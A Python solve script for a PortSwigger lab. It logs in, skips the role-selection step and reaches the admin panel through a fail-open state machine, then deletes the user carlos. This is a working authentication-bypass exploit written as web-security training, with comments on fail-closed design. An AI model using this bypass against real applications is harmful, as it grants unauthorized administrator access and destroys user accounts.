# Lab 09 — Authentication bypass via flawed state machine
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine
#
# Vulnerability: A role-selection step defaults to the highest-privilege
#                role (administrator) if the role-selector page itself is
#                never successfully loaded — an incomplete state
#                transition "fails open" instead of failing safely
# Aim:           Access the admin panel and delete carlos
#
# Technique:
#   Explicitly requesting role=administrator in the role-selection POST is
#   blocked. Instead, DROP the GET request that loads the role-selector
#   page (the step BEFORE role selection) — leaving the state machine in
#   an incomplete state that defaults to administrator privileges.
#
#   ⚠  "Dropping" a request is fundamentally a Burp Proxy interception
#      action — there is no direct equivalent in `requests`, since a
#      script that never sends a request can't demonstrate "intercepting
#      and discarding" one that a browser would have sent automatically.
#      This script logs in normally (establishing the pre-role-selection
#      session state) and then goes STRAIGHT to checking /admin — without
#      ever visiting /role-selector at all, which is the automatable
#      equivalent of "the role-selector GET never completed."
#
# Usage: python business_logic_lab09.py <url>

import sys
import urllib3
from proxies import proxies
from business_logic_utils import banner, section, make_session, login, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 09 — AUTHENTICATION BYPASS VIA FLAWED STATE MACHINE")

    if len(sys.argv) != 2:
        print("  Usage: python business_logic_lab09.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: log in (this reaches the point where role-selection WOULD
    #             normally happen next) ────────────────────────────────────
    print("\n  ── Step 1: log in normally\n")
    if not login(session, url):
        sys.exit(1)

    print("\n  ℹ  Deliberately NOT visiting /role-selector at all — this is the")
    print("     scripted equivalent of dropping the GET request that would")
    print("     normally load the role-selection page in a browser.\n")

    # ── Step 2: go straight to /admin without ever completing role-selection ─
    print("  ── Step 2: attempt /admin access without ever selecting a role\n")
    r_admin = session.get(f"{url}/admin")
    check_status(r_admin, 200, "GET /admin without completing role-selection")

    if r_admin.status_code != 200:
        print("\n  ℹ  If this didn't work, the exact interrupted state needed")
        print("     may require using Burp Proxy directly: log in, then turn")
        print("     on Intercept, click through to trigger the GET request to")
        print("     /role-selector, and DROP that specific request (not")
        print("     forward it) before it ever reaches the server. This")
        print("     leaves session state genuinely mid-transition in a way")
        print("     a script that never issues the request can't fully replicate.")
        sys.exit(1)

    if "carlos" not in r_admin.text:
        print("  ?  'carlos' not visible on admin panel — inspect manually")
        sys.exit(0)

    # ── Step 3: delete carlos ────────────────────────────────────────────────
    print("\n  ── Step 3: delete carlos\n")
    r_delete = session.post(f"{url}/admin/delete", data={"username": "carlos"})
    check_status(r_delete, [200, 302], "Delete carlos")

    print()
    print("  ℹ  A well-designed state machine should default to the LEAST")
    print("     privileged state on any incomplete transition (fail closed).")
    print("     This one defaults to the MOST privileged state instead —")
    print("     'fail open' is one of the most dangerous patterns a state")
    print("     machine can exhibit.")
